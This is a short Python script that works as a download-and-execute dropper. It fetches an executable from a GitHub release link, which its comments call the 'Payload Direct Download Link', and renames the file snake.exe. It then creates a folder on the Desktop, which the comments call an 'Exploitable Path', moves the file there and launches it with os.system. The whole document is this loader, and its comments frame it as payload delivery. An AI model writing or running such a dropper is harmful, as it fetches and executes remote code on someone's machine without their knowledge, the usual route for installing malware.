from sys import exit
from urllib.request import urlretrieve
from shutil import move
import os
from os import getlogin as getlogin, system as system

replink = "https://github.com/xemulat/Basic-Redists/releases/download/1/basic.redists.exe"    #Payload Direct Download Link
repname = "snake.exe"   #DO NOT TOUCH
pyload = "C:/Users/" + getlogin() + "/Desktop/404"  #Exploitable Path (Can Be Changed!)

os.makedirs(pyload)

def powpow():   #Downloader Using UrlLib
    urlretrieve(replink, repname)
    
powpow()    #Launch Downloader
    
move(repname, pyload)   #Move Downloaded File(Snake.exe) To Exploitable Path
payloader = pyload + '/' + repname  #Set Path To Downloaded File
os.system(payloader)    #Launch Downloaded File
